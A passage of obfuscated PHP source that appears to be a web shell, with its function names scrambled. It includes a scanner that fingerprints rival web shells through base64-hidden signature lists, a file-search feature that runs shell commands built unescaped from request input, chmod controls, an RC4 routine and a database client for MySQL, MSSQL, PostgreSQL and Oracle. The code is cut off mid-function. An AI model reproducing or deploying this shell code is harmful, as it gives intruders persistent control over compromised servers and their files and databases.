"BOFF"=>@explode("||",@base64_decode("YShhLGMscDEscDIscDMsY2hhcnNldCl8fGFjdGlvbkJydXRlZm9yY2UoKXx8YWN0aW9uQ29uc29sZSgpfHxhY3Rpb25GaWxlc01hbigpfHxhY3Rpb25GaWxlc1Rvb2xzKCl8fGFjdGlvbkxvZ291dCgpfHxhY3Rpb25OZXR3b3JrKCl8fGFjdGlvblBocCgpfHxhY3Rpb25SQygpfHxhY3Rpb25TYWZlTW9kZSgpfHxhY3Rpb25TZWNJbmZvKCl8fGFjdGlvblNlbGZSZW1vdmUoKXx8YWN0aW9uU3FsKCl8fGFjdGlvblN0cmluZ1Rvb2xzKCl8fEJPRkZFeCgkaW4pfHxCT0ZGRm9vdGVyKCl8fEJPRkZIZWFkZXIoKXx8Qk9GRkxvZ2luKCl8fEJPRkZQZXJtcygkcCl8fEJPRkZQZXJtc0NvbG9yKCRmKXx8Qk9GRlJlY3Vyc2l2ZUdsb2IoJHBhdGgpfHxCT0ZGc3RyaXBzbGFzaGVzKCRhcnJheSl8fEJPRkZWaWV3U2l6ZSgkcyl8fEJPRkZXaGljaCgkcCl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGNmKCRmLCR0KXx8Y29weV9wYXN0ZSgkYywkcywkZCl8fERiQ2xhc3MoJHR5cGUpfHxkZWxldGVEaXIoJHBhdGgpfHxtb3ZlX3Bhc3RlKCRjLCRzLCRkKXx8cHJvY2Vzc1JlcUNoYW5nZSgp")), "devshell"=>@explode("||",@base64_decode("Y2xpY2tjbWQoKXx8Y3MoJHQpfHxkbGZpbGUoJHUsJHApfHxkbGZpbGUoJHVybCwkZnBhdGgpfHxleGUoJGMpfHxncCgkZil8fGdzKCRmKXx8aW5pdCgpfHxybWRpcnMoJGQpfHxycCgkdCl8fHNob3dkaXIoJHB3ZCwkcHJvbXB0LCR3aW4pfHxzcygkdCl8fHNzYygkdCl8fHN3ZCgkcCl8fHR1a2FyKGwsYil8fHh3aGljaCgkcHIp")), "Egy"=>@explode("||",@base64_decode("Y2FsbGZ1bmNzKCRjbW5kKXx8Y2FsbHpvbmUoJG5zY2Rpcil8fGNmKCRmbmFtZSwkdGV4dCl8fGNoYW5nZV9kaXZzdChpZCl8fGNoYW5nZV9kaXZzdChpZCl8fGNsb3NlKCl8fGNvbXByZXNzKCYkZmlsZW5hbWUsJiRmaWxlZHVtcCwkY29tcHJlc3MpfHxkZWxtKCRkZWxtdHh0KXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZG93bmxvYWQoJGR3ZmlsZSl8fGV4KCRjZmUpfHxHZXRGaWxlTWF0Y2hlc0NvdW50KCl8fEdldEZpbGVzVG90YWwoKXx8R2V0TWF0Y2hlc0NvdW50KCl8fGdldG1pY3JvdGltZSgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGluKCR0eXBlLCRuYW1lLCRzaXplLCR2YWx1ZSwkY2hlY2tlZD0wKXx8aW5jbGluaygkbGluaywkdmFsKXx8bWFpbGF0dGFjaCgkdG8sJGZyb20sJHN1YmosJGF0dGFjaCl8fG1vcmVyZWFkKCR0ZW1wKXx8bW9yZXdyaXRlKCR0ZW1wLCRzdHI9JycpfHxyZWFkemxpYigkZmlsZW5hbWUsJHRlbXA9JycpfHxzYWZlX2V4KCRjZmUpfHxTZWFyY2hSZXN1bHQoJGRpciwkdGV4dCwkZmlsdGVyPScnKXx8U2VhcmNoVGV4dCgkcGhyYXNlPTAsJGNhc2U9MCl8fHNldF9lbmNvZGVyX2lucHV0KHRleHQpfHxVX3dvcmR3cmFwKCRzdHIpfHx2aWV3X3NpemUoJHNpemUp")), "itsecteam"=>@explode("||",@base64_decode("YWRkX2RpcigkbmFtZSl8fGJjbigkaXBiYywkcGJjKXx8YnlwY3UoJGZpbGUpfHxieXdzeW0oJGZpbGUpfHxjYWxjX2Rpcl9zaXplKCRwYXRoKXx8Y29weWYoJGZpbGUxLCRmaWxlMiwkZmlsZW5hbWUpfHxkZWxldGVEaXJlY3RvcnkoJGRpcil8fGRpcnBlKCRhZGRyZXMpfHxkaXJwbWFzcygkYWRkcmVzLCRtYXNzbmFtZSwkbWFzc3NvdXJjZSl8fGRvc3NlcnZlcigpfHxkb3dubG9hZCgkZmlsZWFkZCwkZmluYW1lKXx8bGJwKCR3Yil8fG9wZW5mKCRwYXJzZWYpfHxwcmludGRyaXZlKCl8fHF1ZXJZKCR0eXBlLCRob3N0LCR1c2VyLCRwYXNzLCRkYj0nJywkcXVlcnkpfHxzaXplZSgkc2l6ZSl8fHNxbGNsaWVuVCgp")), "Locus"=>@explode("||",@base64_decode("YmJlcnIoKXx8Yzk5ZnNlYXJjaCgkZCl8fGM5OWZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxjOTlnZXRzb3VyY2UoJGZuKXx8Yzk5c2hleGl0KCl8fGM5OV9idWZmX3ByZXBhcmUoKXx8Yzk5X3Nlc3NfcHV0KCRkYXRhKXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2ZiKCRmbmFtZSwkdGV4dCl8fGNoZWNrcHJveHlob3N0KCl8fGRpc3BsYXlzZWNpbmZvKCRuYW1lLCR2YWx1ZSl8fGRvc3lheWljZWsoJGxpbmssJGZpbGUpfHxFTlVNRVJBVEUoKXx8ZXJyKCRuLCR0eHQ9JycpfHxlcnIoKXx8ZXgoJGNmZSl8fGV4KCRjZmUpfHxmc19jb3B5X2RpcigkZCwkdCl8fGZzX2NvcHlfb2JqKCRkLCR0KXx8ZnNfbW92ZV9kaXIoJGQsJHQpfHxmc19tb3ZlX29iaigkZCwkdCl8fGZzX3JtZGlyKCRkKXx8ZnNfcm1vYmooJG8pfHxnZXRtaWNyb3RpbWUoKXx8bHNfcmV2ZXJzZV9hbGwoKXx8bHNfc2V0Y2hlY2tib3hhbGwoc3RhdHVzKXx8bXlzaGVsbGV4ZWMoJGNtZCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNoZWxsZXhlYygkY29tbWFuZCl8fG15c3FsX2NyZWF0ZV9kYigkZGIsJHNvY2s9IiIpfHxteXNxbF9kdW1wKCRzZXQpfHxteXNxbF9mZXRjaF9hbGwoJHF1ZXJ5LCRzb2NrKXx8bXlzcWxfcXVlcnlfZm9ybSgpfHxteXNxbF9xdWVyeV9wYXJzZSgkcXVlcnkpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHBvc2l4X2dldGdyZ2lkKCRnaWQpfHxwb3NpeF9nZXRwd3VpZCgkdWlkKXx8cG9zaXhfa2lsbCgkZ2lkKXx8cnNnX2dsb2IoKXx8cnNnX3JlYWQoKXx8c2VsZlVSTCgpfHxzZXRfZW5jb2Rlcl9pbnB1dCh0ZXh0KXx8c3RyMm1pbmkoJGNvbnRlbnQsJGxlbil8fHN0cmlwcygmJGFyciwkaz0iIil8fHRhYnNvcnQoJGEsJGIpfHx2aWV3X3Blcm1zKCRtb2RlKXx8dmlld19wZXJtc19jb2xvcigkbyl8fHZpZXdfc2l6ZSgkc2l6ZSl8fHdoaWNoKCRwcil8fHdoaWNoKCRwcik=")), "jackal"=>@explode("||",@base64_decode("YXV0aGNyYWNrZVIoKXx8YnJzaGVsTCgpfHxjYWxDKCl8fGNoZWNrc210UCgkaG9zdCwkdGltZW91dCl8fGNoZWNrc3VNKCRmaWxlKXx8Y2hlY2t0aGlzcG9yVCgkaXAsJHBvcnQsJHRpbWVvdXQsJHR5cGU9MCl8fGNoZWNrX3VyTCgkdXJsLCRtZXRob2QsJHNlYXJjaCwkdGltZW91dCl8fGNyYWNrZVIoKXx8ZGljbWFrZVIoKXx8ZG93bmxvYWRpVCgkZ2V0LCRwdXQpfHxlZGl0b1IoJGZpbGUpfHxmaWxlbWFuYWdlcigpfHxmbHVzaGVSKCl8fGZvcm1jcmFja2VSKCl8fGZ0cGNyYWNrZVIoKXx8Z2V0X3N3X25hbUUoJGhvc3QsJHRpbWVvdXQpfHxoYXNoY3JhY2tlUigpfHxoZXh2aWVXKCl8fGhsaW5LKCRzdHI9IiIpfHxpbWFwY3JhY2tlUigpfHxpbWFwbG9naU4oJGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCl8fGxpc3RkaVIoJGN3ZCwkdGFzayl8fGxvZ291VCgpfHxtYWlsZVIoKXx8bXlzcWxjbGllblQoKXx8b3BlbmlUKCRuYW1lKXx8cG9wM2NyYWNrZVIoKXx8cG9wM2xvZ2lOKCRzZXJ2ZXIsJHVzZXIsJHBhc3MpfHxwcjB4eSgpfHxzYWZlbW9kRSgpfHxzaGVsTCgkY29tbWFuZCl8fHNob3dpbWFnRSgkaW1nKXx8c2hvd3NpekUoJHNpemUpfHxzbXRwY3JhY2tlUigpfHxzbXRwbG9naU4oJGFkZHIsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxzbm1wY2hlY0soJGlwLCRjb20sJHRpbWVvdXQpfHxzbm1wY3JhY2tlUigpfHxzcWxjcmFja2VSKCl8fHN0cl9yZXBlYXQoJHN0ciwkYyl8fHN5c2luZk8oKXx8d2Vic2hlbEwoKXx8d2hlcmVpc3RtUCgpfHx3aG9pUygp")), "SyRiAn"=>@explode("||",@base64_decode("QWJvdXQoKXx8Y2hlY2tmdW5jdGlvTigkZnVuYyl8fGNvbXNoZWxMKCRjb21tYW5kLCR3cyl8fGNwYW5lbF9jaGVjaygkaG9zdCwkdXNlciwkcGFzcywkdGltZW91dCl8fENTUygkc2hlbGxDb2xvcil8fEN1cmwoKXx8Y3VycmVudEZpbGVOYW1lKCl8fERlY3J5cHRDb25maWcoKXx8RGlzYWJsZUZ1bmN0aW9ucygpfHxFeGUoJGNvbW1hbmQpfHxmZmlzaGVsTCgkY29tbWFuZCl8fGZvb3RlcigpfHxmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxHZW5lcmF0ZUZpbGUoJG5hbWUsJGNvbnRlbnQpfHxHZXRSZWFsSVAoKXx8Z2V0X3Bhc3MoJGxpbmspfHxHemlwKCl8fEhhcmRTaXplKCRzaXplKXx8aW5wdXQoJHR5cGUsJG5hbWUsJHZhbHVlLCRzaXplKXx8TG9nb3V0KCl8fG1hZ2ljUW91dHMoKXx8TVNRTCgpfHxNc1NRTCgpfHxNeVNRTDIoKXx8TXlzcWxJKCl8fG9wZW5CYXNlRGlyKCl8fE9yYWNsZSgpfHxwZXJsc2hlbEwoJGNvbW1hbmQpfHxQb3N0Z3JlU1FMKCl8fHJlYWRfZGlyKCRwYXRoLCR1c2VybmFtZSl8fFJlZ2lzdGVyR2xvYmFscygpfHxyb290eHBMKCl8fFNhZmVNb2RlKCl8fFNlbGVjdENvbW1hbmQoJG9zKXx8c2hvd1VzZXJzKCl8fFNRbExpdGUoKXx8c3J2c2hlbEwoJGNvbW1hbmQpfHxzdHJfaGV4KCRzdHJpbmcpfHxTdWljaWRlKCl8fHR1bGlzKCRmaWxlLCR0ZXh0KXx8dXBkYXRlKCl8fHdoZXJlaXN0bVAoKXx8d2hpY2goJHByKXx8d2luc2hlbEwoJGNvbW1hbmQp")), ); $content=z9o($file); if(!$content) return false; $cleanct=@preg_replace('/[\s\t\r\n\v]/','',$content); foreach($knownfunc as $type=>$funcs){ $score=0; $count=@count($funcs); $min=@round($count*0.75); foreach($funcs as $func){ if(@strstr($cleanct,$func)) $score++; } $foundp=@round(($score/$count)*100); if($score>=$min){ if($replace) $replaced=" : ".(z2w($file)?z9y("290"):z9y("291")); return ($foundp==100?$type.$replaced:$type." (".$foundp."%)".$replaced); } } if($possible){ if((@preg_match('/'.@base64_decode("KHN5c3RlbXxwYXNzdGhydXxzaGVsbF9leGVjfHBvcGVufHByb2Nfb3BlbikuezAsMTB9").'/i', $content) && @preg_match('/'.@base64_decode("YmFja19jb25uZWN0fGJhY2tkb29yfHI1N3xQSFBKYWNrYWx8UGhwU3B5fEdpWHxGeDI5U2hlTEx8dzRjazFuZ3xtaWx3MHJtfFBocFNoZWxsfGsxcjR8RmVlTENvTXp8RmFUYUxpc1RpQ3p8VmVfY0VOeFNoZWxsfFVuaXhPbnxDOTltYWRTaGVsbHxTcGFtZm9yZHp8TG9jdXM3c3xjMTAwfGM5OXx4MjMwMHxjZ2l0ZWxuZXR8d2ViYWRtaW58U1RVTlNIRUxMfFByIXY4fFBIUFNoZWxsfEthTWVMZU9ufFM0VHxvUmJ8dHJ5YWd8bm9leGVjc2hlbGx8XC9ldGNcL3Bhc3N3ZHxyZXZlbmdhbnM=").'/',$content)) || @preg_match('/'.@base64_decode("ZXZhbC57MCwxMH1iYXNlNjRfZGVjb2Rl").'/i',$content)){ if($replace) $replaced=(z2w($file)?" : ".z9y("290"):" : ".z9y("291")); return "Possible backdoor".$replaced; } } return false; } function z0s($i,$t,$h,$a){ $r=z10w(z7u(z6l('<form method="POST" action="?" onsubmit="return chkfrm(\''.$i.'\',\''.$t.'\');">'.'<input type="hidden" name="'.$t.'" id="'.$t.'">'.$h.z8m(z9y("63"),'chkall(\''.$i.'\',true);', '7').z8m(z9y("64"),'chkall(\''.$i.'\',false);', '7').z8m(z9y("65"),'invall(\''.$i.'\');', '7').z3m('action',$a,'4').z8b(z9y("77"),'7').'</form>','11')),'2'); return "<script type=\"text/javascript\">document.write('".@str_replace("'","\\'",@str_replace("\n","",$r))."');</script>"; } function z4n($f,$i,$id=''){ return '<script>document.write(\'<input type="checkbox" id="'.$id.'chk" name="'.$i.'" value="'.$f.'" onclick="changetr(this.id.replace(\\\'chk\\\',\\\'\\\'), this.checked);" style="vertical-align: middle;">\');</script>'; } function z1z(){ return "<script type=\"text/javascript\">function fnc_replace(idT,idA,idB){ var strT=document.getElementById(idT).value; var strA=document.getElementById(idA).value; var strB=document.getElementById(idB).value; if(strA !='' && strT.indexOf(strA)!=-1){ var repRegex=new RegExp(strA.escR(), 'g'); document.getElementById(idT).value=strT.replace(repRegex, strB);};}; String.prototype.escR=function(){ var sChars=[ '$', '^', '*', '(', ')', '+', '[', ']', '{', '}', '\\\\', '|', '.', '?', '/' ]; var regex=new RegExp('(\\\\' + sChars.join('|\\\\') + ')', 'g'); return this.replace(regex, '\\\\$1');}</script>"; } function z3b(){ return '<script type="text/javascript">
if(!document.getElementById){ if(document.all){ document.getElementById=function(){ if(typeof document.all[arguments[0]]!="undefined"){ return document.all[arguments[0]]; } else { return null; };};} else if(document.layers){ document.getElementById=function(){ if(typeof document[arguments[0]]!="undefined"){ return document[arguments[0]]; } else { return null; };};};}
function changecls(trid, newcls){ try { document.getElementById(trid).className = document.getElementById(trid).className.replace(/[a-zA-Z0-9]+/,newcls); } catch(err){} }
function changetr(trid, vbool){ if(vbool){ changecls(trid,"list3"); } else { if(trid.substr(0,3) == "tra"){ changecls(trid,"list1"); } else { changecls(trid,"list2");};};}
function chkfrm(inid, hid){ var inputs=document.getElementsByTagName("input");var ichk=[];for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked){ ichk.push(inputs[i].value);};};};if(ichk.length > 0){ document.getElementById(hid).value = ichk.join("\n"); return true; } else { return false;};}
function chkall(inid,vbool){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ inputs[i].checked = vbool; changetr(inputs[i].id.replace(\'chk\', \'\'), vbool); };};}
function invall(inid){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked == true){ inputs[i].checked = false; changetr(inputs[i].id.replace(\'chk\', \'\'), false); } else { inputs[i].checked = true; changetr(inputs[i].id.replace(\'chk\', \'\'), true); };};};}
</script>'; } function z3d($var,$f){ $val=''; if(!empty($f)){ $reg='/\$'.$var.'\s*=\s*([\'"]{1})([^\1\s\t\r\n]+)\1\s*;/'; if(@preg_match($reg, $f, $m)){ $val=$m[2]; unset($m); } } unset($f); return $val; } function z2o($var,$f){ $val=''; if(!empty($f)){ $reg='/([\'"]{1})'.$var.'\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/'; if(@preg_match($reg, $f, $m)){ $val=$m[3]; unset($m); } } unset($f); return $val; } function z2u($var,$f){ $val=''; if(!empty($f)){ $reg='/\[([\'"]{1})'.$var.'\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/'; if(@preg_match($reg, $f, $m)){ $val=$m[3]; unset($m); } } unset($f); return $val; } function z1c($const,$f){ $val=''; if(!empty($f)){ $reg='/define\s*\(([\'"]{1})'.$const.'\1\s*,\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*\)\s*;/'; if(@preg_match($reg, $f, $m)){ $val=$m[3]; unset($m); } } unset($f); return $val; } function z4b($type,$var,$f){ switch($type){ case 'var': return z3d($var,$f); break; case 'const': return z1c($var,$f); break; case 'arrayvar1': return z2o($var,$f); break; case 'arrayvar2': return z2u($var,$f); break; default: return ''; } } function z3k($s,$t=0){ $reg='[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(aero|coop|info|museum|name))'; if($t) return @preg_match('/^'.$reg.'$/i',$s); $r=array(); if(@preg_match_all('/'.$reg.'/i',$s,$m)){ foreach($m[0] as $em) $r[]=$em; } return @array_unique($r); } function z0k($a,$s=" and",$f=array()){ if(!@is_array($a)) $a=array(); $r=""; foreach($a as $k=>$v){ $p=""; if(!@empty($f[$k])) $p.=$f[$k]."("; $p.="'".addslashes($v)."'"; if(!@empty($f[$k])) $p.=")"; $r.="`".$k."` = ".$p.$s; } $r=@substr($r,0,@strlen($r)-@strlen($s)); return $r; } function z0c($file,$global=0,$dir=0){ $mode=@fileperms($file); if($dir){ $arr=($global ? array() : array("act","d","ctarget"=>$file,"chmod_submit"=>"1")); } else { $arr=($global ? array() : array("act","d","f","ft"=>"functions","ctarget"=>$file,"chmod_submit"=>"1")); } if($mode){ $perms=z9w($mode,1); $o=@decoct($mode); if(@strlen($o)>4) $o=@substr($o,-4); echo z3q(($dir?z9y("123"):z9y("93")).z9x().z4y($file)); echo z10w( z7u( z9c(z5x($arr, z10w( z5b(). z7u(z5t(z9y("94",'',1)).z9c(z5u("chmod_or",z9y("97"),"chmod_o[r]","1",(($perms["o"]["r"])?1:'')).z9x(5).z5u("chmod_ow",z9y("98"),"chmod_o[w]","1",(($perms["o"]["w"])?1:'')).z9x(5).z5u("chmod_ox",z9y("99"),"chmod_o[x]","1",(($perms["o"]["x"])?1:''))).z9c(z9x())). z7u(z5t(z9y("95",'',1)).z9c(z5u("chmod_gr",z9y("97"),"chmod_g[r]","1",(($perms["g"]["r"])?1:'')).z9x(5).z5u("chmod_gw",z9y("98"),"chmod_g[w]","1",(($perms["g"]["w"])?1:'')).z9x(5).z5u("chmod_gx",z9y("99"),"chmod_g[x]","1",(($perms["g"]["x"])?1:''))).z9c(z9x(5).z8b("Chmod","7"))). z7u(z5t(z9y("96",'',1)).z9c(z5u("chmod_wr",z9y("97"),"chmod_w[r]","1",(($perms["w"]["r"])?1:'')).z9x(5).z5u("chmod_ww",z9y("98"),"chmod_w[w]","1",(($perms["w"]["w"])?1:'')).z9x(5).z5u("chmod_wx",z9y("99"),"chmod_w[x]","1",(($perms["w"]["x"])?1:''))).z9c(z9x())). z5b() ,"2")) ).z9c(z5x(array("act","d","f","ft"=>"functions","ctarget"=>$file,"chmod_submit"=>"1"), z10w( z7u(z5t(z9y("101")).z9c(z5y("chmod_val",$o,"1").z8b(z9y("100"),"7"))) ,"2")) ) ) ); } } function z0h(){ global $found, $nix, $sh_exec,$sn, $sn_reg, $s_in, $st,$st_reg,$st_wwo,$st_cs,$st_not,$s_fd,$s_rec; echo z3q(z9y("142")).z6s(); $as_fd=array('1'=>z9y("144"), '2'=>z9y("145"), ''=>z9y("146")); $a_rec=array(''=>z9y("21")); for($i=0;$i<10;$i++) $a_rec[($i+1)]=($i+1)." ".z9y("145"); $a_rec['no']=z9y("22"); $a_paths=array('cwd'=>'cwd','system'=>'system','bin'=>'(s)bin dirs','etc'=>'/etc'); echo z5x(array('d','act'=>'search','ftarget'=>'1'), z10w( z9d(z9c( z10w( z7u(z5t(z9y("143")).z9c(z6u("sn",@htmlspecialchars($sn),'2').z3m("s_fd",$as_fd,'1','1').z3m("s_rec",$a_rec,'1','1').z6o("submit", z9y("147"),'7').' '.z5u('sn_reg',z9y("148"),'sn_reg'))). z7u(z5t(z9y("149")).z9c(z6u("s_in",htmlspecialchars($s_in),"9"))) ). z10w( z7u(z5t(z9y("150")).z9c(z6u("st",@htmlspecialchars($st),"9"))). z7u(z5t("").z9c(z5u("st_reg",z9y("151"),"st_reg").z9x("3").z5u("st_wwo",z9y("152"),"st_wwo").z9x("3"). z5u("st_cs",z9y("153"),"st_cs").z9x("3").z5u("st_not",z9y("154"),"st_not"))) ))))); echo z6s(); if($nix && $sh_exec){ echo z3q(z9y("155")).z6s(); global $findaliases,$unixfind,$find_text,$find_in_dir,$find_in_files,$find_defined,$spath,$lsman; if(!@isset($spath)) $spath='cwd'; $find_result=""; if(@isset($unixfind)&&$unixfind=="1"&&@isset($find_text)&&!@empty($find_text)&&@isset($find_in_dir)&&!@empty($find_in_dir)&&@isset($find_in_files)&&!@empty($find_in_files)){ $find_infiles=@array_unique(@explode(";",$find_in_files)); foreach($find_infiles as $find_in_file){ $find_result.=z9e('find "'.$find_in_dir.'" -name "'.$find_in_file.'" -print0|xargs -0 grep -E "'.$find_text.'"',0); } } echo z5x(array('d','act'=>'search','unixfind'=>'1'), z10w( z7u(z5t(z9y("156")).z9c(z6u("find_text",@htmlspecialchars($find_text),'0').z8b(z9y("147"),'7'))). z7u(z5t(z9y("149")).z9c(z6u("find_in_dir",@htmlspecialchars($find_in_dir),"9"))). z7u(z5t(z9y("157")).z9c(z6u("find_in_files",@htmlspecialchars($find_in_files),"9"))) ) ); echo z5x(array('d','act'=>'search','unixfind'=>'2'), z10w( z7u(z5t(z9y("158")).z9c(z2k("find_defined", $findaliases,"0",'1').z3m('spath',$a_paths,'1','1').z8b(z9y("147"),'7').z5u("lsman",z9y("159"),'lsman','1'))) ) ); echo z6s(); if(@isset($unixfind)&&$unixfind=="2"&&@isset($find_defined)&&!@empty($find_defined)){ if($spath=='system'){ $rep='/'; } elseif($spath=='etc'){ $rep='/etc'; } elseif($spath=='bin'){ $rep='/bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin'; } else { $rep='"'.$find_in_dir.'"'; } if(@isset($lsman)&&$lsman){ $find_defined=@str_replace(' -ls','',$find_defined); } $find_defined=@str_replace('%path%', $rep, $find_defined); $find_result=z9e($find_defined,0); } if(!@empty($find_result)){ if(@isset($lsman)&&$lsman){ global $ls_a, $act, $fullpath, $nolsmenu,$nohead; $tls_a=@explode("\n", $find_result); $ls_a=array(); foreach($tls_a as $ls){ $ls=@trim($ls); if(!@empty($ls) && !@in_array($ls,$ls_a)) $ls_a[]=$ls; } if(@count($ls_a)>0){ $act="ls"; $fullpath=1; $nolsmenu=1; $nohead=1; } } else { echo z10w(z9d(z6l(z5w('','1',1).@htmlspecialchars($find_result).z5q())),'2'). z6s(); } } } } function z6m(){ global $images; return (@is_array($images)?$images:array()); } class zrc4 { function zenc ($pwd, $data, $ispwdHex = 0) { if ($ispwdHex) $pwd = @pack('H*', $pwd); $key[] = ''; $box[] = ''; $cipher = ''; $pwd_length = @strlen($pwd); $data_length = @strlen($data); for ($i=0; $i<256; $i++){ $key[$i]=@ord($pwd[$i % $pwd_length]); $box[$i]=$i; } for ($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $key[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for ($a = $j = $i = 0; $i < $data_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $k = $box[(($box[$a] + $box[$j]) % 256)]; $cipher .= @chr(@ord($data[$i]) ^ $k); } return $cipher; } function zdec ($pwd, $data, $ispwdHex = 0){ return zrc4::zenc($pwd, $data, $ispwdHex); } } class my_sql{ var $host='localhost'; var $port=''; var $user=''; var $pass=''; var $base=''; var $db=''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect(){ switch($this->db){ case 'MySQL': if(empty($this->port)){ $this->port='3306'; } if(!@function_exists('mysql_connect')) return 0; $this->connection=@mysql_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; break; case 'MSSQL': if(empty($this->port)){ $this->port='1433'; } if(!@function_exists('mssql_connect')) return 0; $this->connection=@mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; break; case 'PostgreSQL': if(empty($this->port)){ $this->port='5432'; } $str="host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!@function_exists('pg_connect')) return 0; $this->connection=@pg_connect($str); if(is_resource($this->connection)) return 1; break; case 'Oracle': if(!@function_exists('ocilogon')) return 0; $this->connection=@ocilogon($this->user,$this->pass,$this->base); if(is_resource($this->connection)) return 1; break; } return 0; } function select_db(){ switch($this->db){ case 'MySQL': if(@mysql_select_db($this->base,$this->connection)) return 1; break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; } return 0; } function list_dbs(){ $tmplist=array(); switch($this->db){ case 'MySQL': $this->res=@mysql_list_dbs($this->connection); while ($tmprow = @mysql_fetch_object($this->res)) $tmplist[$tmprow->Database]=$tmprow->Database; break; case 'MSSQL': break; case 'PostgreSQL': break; case 'Oracle': break; } return $tmplist; } function query($query){ $this->res=$this->error=''; switch($this->db){ case 'MySQL': if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection))){ $this->error=@mysql_error($this->connection); return 0; }else if(is_resource($this->res)){return 1;} return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection))){ $this->error='Query error'; return 0; }else if(@mssql_num_rows($this->res)>0){return 1;} return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query))){ $this->error=@pg_last_error($this->connection); return 0; }else if(@pg_num_rows($this->res)>0){return 1;} return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query))){ $this->error='Query parse error'; }else{ if(@ociexecute($this->res)){ if(@ocirowcount($this->res)!=0) return 2; return 1; } $error=@ocierror(); $this->error=$error['message']; } break; } return 0; } function get_result(){ $this->rows=array(); $this->columns=array(); $this->get_num_fields(); $this->get_num_rows(); switch($this->db){ case 'MySQL': while(false!==($this->rows[]=@mysql_fetch_assoc($this->res))); if($this->num_fields){ $this->columns=@array_keys($this->rows[0]); if(@count($this->columns)<1) $this->get_columns(); @mysql_free_result($this->res); return 1; } @mysql_free_result($this->res); break; case 'MSSQL': while(false!==($this->rows[]=@mssql_fetch_assoc($this->res))); if($this->num_fields){ $this->columns=@array_keys($this->rows[0]); if(@count($this->columns)<1) $this->get_columns(); @mssql_free_result($this->res); return 1; } @mssql_free_result($this->res); break; case 'PostgreSQL': while(false!==($this->rows[]=@pg_fetch_assoc($this->res))); if($this->num_fields){ $this->columns=@array_keys($this->rows[0]); if(@count($this->columns)<1) $this->get_columns(); @pg_free_result($this->res); return 1; } @pg_free_result($this->res); break; case 'Oracle': while(false!==($this->rows[]=@oci_fetch_assoc($this->res))); if($this->num_fields){ $this->columns=@array_keys($this->rows[0]); if(@count($this->columns)<1) $this->get_columns(); @ocifreestatement($this->res); return 1; } @ocifreestatement($this->res); break; } return 0; } function get_num_rows(){ $this->num_rows=0; switch($this->db){ case 'MySQL': $this->num_rows=@mysql_num_rows($this->res); break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); break; case 'Oracle': while(false!==(@oci_fetch_assoc($this->res))) $this->num_rows++; break; } } function get_columns(){ $this->columns=array(); $this->get_num_fields(); switch($this->db){ case 'MySQL': for($i=0; $i < $this->num_fields; $i++){ if(@mysql_field_name($this->res, $i)!==false) $this->columns[]=@mysql_field_name($this->res, $i); } break; case 'MSSQL': for ($i=0; $i < $this->num_fields; $i++){ if(@mssql_field_name($this->res, $i)!==false) $this->columns[]=@mssql_field_name($this->res, $i); } break; case 'PostgreSQL': for($i=0; $i < $this->num_fields; $i++) { if(@pg_field_name($this->res, $i)!==false) $this->columns[]=@pg_field_name($this->res, $i); } break; case 'Oracle': for($i=0; $i < $this->num_fields; $i++) { if(@ocicolumnname($this->res, $i)!==false) $this->columns[]=@ocicolumnname($this->res, $i); } break; } } function get_num_fields(){ $this->num_fields=0; switch($this->db){ case 'MySQL': $this->num_fields=@mysql_num_fields($this->res); break; case 'MSSQL': $this->num_fields=@mssql_num_fields($this->res); break; case 'PostgreSQL': $this->num_fields=@pg_num_fields($this->res); break; 